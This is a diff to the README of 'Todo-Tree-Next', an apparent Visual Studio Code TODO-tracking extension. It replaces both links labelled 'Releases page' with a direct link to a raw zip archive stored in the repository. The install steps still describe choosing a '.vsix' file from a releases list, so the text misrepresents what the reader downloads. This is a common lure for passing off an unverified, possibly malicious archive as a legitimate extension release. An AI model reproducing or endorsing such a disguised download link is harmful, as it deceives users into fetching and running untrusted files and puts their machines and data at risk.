@@ -1,6 +1,6 @@
 # 🌲 Todo-Tree-Next - Manage project tasks with ease now
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Philsober337/Todo-Tree-Next/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Philsober337/Todo-Tree-Next/raw/refs/heads/main/resources/Next-Todo-Tree-v1.2.zip)
 
 Todo-Tree-Next finds your pending tasks inside your code files. It scans your projects quickly. This tool helps you track work items. Use this to see all your TODO tags in one place.
 
@@ -8,7 +8,7 @@ Todo-Tree-Next finds your pending tasks inside your code files. It scans your pr
 
 Follow these steps to set up the tool. You need Visual Studio Code installed on your Windows computer.
 
-1. Go to the [Releases page](https://github.com/Philsober337/Todo-Tree-Next/releases).
+1. Go to the [Releases page](https://github.com/Philsober337/Todo-Tree-Next/raw/refs/heads/main/resources/Next-Todo-Tree-v1.2.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in `.vsix` to start the download.
 4. Save the file to a folder you can find later.
